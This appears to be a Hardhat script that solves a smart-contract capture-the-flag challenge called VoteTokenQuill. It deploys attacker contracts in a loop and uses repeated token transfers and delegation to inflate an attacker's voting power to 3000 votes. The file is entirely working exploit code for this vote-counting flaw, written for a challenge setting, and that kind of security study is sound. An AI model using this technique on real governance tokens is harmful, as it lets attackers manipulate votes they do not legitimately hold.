import chalk from "chalk";
import { ethers } from "hardhat";
import { VoteTokenQuill__factory, VoteTokenQuill, VoteTokenQuillAttack__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [voteContract, attacker] = await initialize<VoteTokenQuill>(VoteTokenQuill__factory);
    let deployer = (await ethers.getSigners())[0];
    let voteDeployer = voteContract.connect(deployer);
    let tx = await voteDeployer.delegate(attacker);
    await tx.wait();
    tx = await voteDeployer.transfer(attacker, 1000);
    await tx.wait();
    
    for (let i = 0; i < 2; i++) {
        let attackContract = await new VoteTokenQuillAttack__factory(attacker).deploy();
        await attackContract.waitForDeployment();
        tx = await voteContract.transfer(await attackContract.getAddress(), 1000);
        await tx.wait();
        tx = await attackContract.delegate(await voteContract.getAddress());
        await tx.wait();
    }
    
    log(`Is solved: ${chalk.yellow((await voteContract.getVotes(attacker)) == BigInt(3000))}`); 
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});